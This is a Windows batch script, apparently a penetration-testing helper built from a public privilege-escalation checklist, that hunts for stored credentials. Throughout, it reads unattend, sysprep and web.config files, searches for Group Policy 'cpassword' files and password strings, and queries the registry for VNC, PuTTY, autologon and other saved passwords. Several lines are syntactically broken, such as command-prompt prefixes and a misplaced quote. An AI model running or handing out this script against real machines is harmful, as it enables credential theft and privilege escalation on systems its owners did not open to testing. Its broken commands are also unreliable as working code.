@echo off
rem:: https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md

echo -- Storeds Creds ---

echo
echo - Windows Files -
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml

echo
echo - IIS Files -
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config

echo 
echo - Group Policy Preferences -
echo REF: https://pentestlab.blog/2017/03/20/group-policy-preferences/
dir /s Groups.xml

echo - Search 'cpassword' Location
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml


echo
echo - Possible Passwords - 
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

echo 
echo - Elevated Credentials Storage? -
C:\> dir /b /s unattend.xml
C:\> dir /b /s web.config
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
C:\> dir /b /s vnc.ini

echo
echo - McAfee Password? -
type %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml

echo
echo - RealVNC - 
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

echo
echo - Putty - 
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"

echo -- Registry --
echo
echo - Creds - 
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

echo
echo - Windows Autolgin - 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

